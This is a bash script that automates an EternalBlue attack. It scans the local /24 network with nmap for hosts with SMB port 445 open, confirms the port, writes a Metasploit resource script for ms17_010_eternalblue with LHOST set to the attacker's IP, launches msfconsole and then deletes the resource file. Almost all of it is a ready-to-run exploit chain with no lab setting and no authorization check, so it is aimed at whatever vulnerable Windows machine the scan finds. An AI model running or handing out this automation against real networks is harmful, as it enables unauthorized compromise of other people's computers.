#!/bin/bash

# Function to get the local IP address
get_local_ip() {
    local_ip=$(hostname -I | awk '{print $1}')
    echo "$local_ip"
}

# Function to get the network range from the local IP address
get_network_range() {
    local_ip=$1
    # Extract the subnet from the local IP address
    subnet=$(echo $local_ip | awk -F '.' '{print $1 "." $2 "." $3 ".0/24"}')
    echo "$subnet"
}

# Function to create the Metasploit resource script
create_rc_file() {
    local target_ip=$1
    local my_ip=$2
    echo "Creating Metasploit resource script (metasploit_commands.rc)..."
    cat <<EOL > metasploit_commands.rc
spool /tmp/loot.log
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target_ip
set LHOST $my_ip
exploit

EOL
    echo "Metasploit resource script created successfully."
}

# Function to perform a quick Nmap scan to find the target IP
find_target_ip() {
    local network_range=$1
    echo "Scanning the network range $network_range to find hosts with port 445 open..."
    # Run nmap to find hosts with port 445 open
    target_ip=$(nmap -p 445 --open $network_range | grep "Nmap scan report" | awk '{print $5}')
    
    if [ -z "$target_ip" ]; then
        echo "Target IP not found. Exiting."
        exit 1
    else
        echo "Target IP found: $target_ip"
    fi
}

# Function to perform a quick Nmap scan to check if port 445 is open
check_port() {
    local target_ip=$1
    echo "Double-checking that port 445 is open on $target_ip..."
    nmap -T5 -p 445 $target_ip | tee /dev/tty | grep -q "open"
    if [ $? -eq 0 ]; then
        echo "Port 445 is confirmed open on $target_ip. Proceeding with Metasploit."
    else
        echo "Port 445 is not open on $target_ip. Exiting."
        exit 1
    fi
}

# Main function
main() {
    echo "Starting script..."
    
    local my_ip
    my_ip=$(get_local_ip)
    echo "Detected local IP address: $my_ip"
    
    # Get the network range based on local IP
    local network_range
    network_range=$(get_network_range "$my_ip")
    echo "Network range detected: $network_range"
    
    # Find the target IP automatically
    find_target_ip "$network_range"
    
    # Perform a quick Nmap scan to double-check if port 445 is open
    check_port "$target_ip"
    
    # Create the .rc file
    create_rc_file "$target_ip" "$my_ip"
    
    # Run Metasploit console with the .rc file directly
    echo "Launching Metasploit with metasploit_commands.rc..."
    msfconsole -r metasploit_commands.rc
    
    # Optionally remove the .rc file
    echo "Cleaning up: removing metasploit_commands.rc..."
    rm metasploit_commands.rc
    
    echo "Script finished."
}

# Run the main function
main
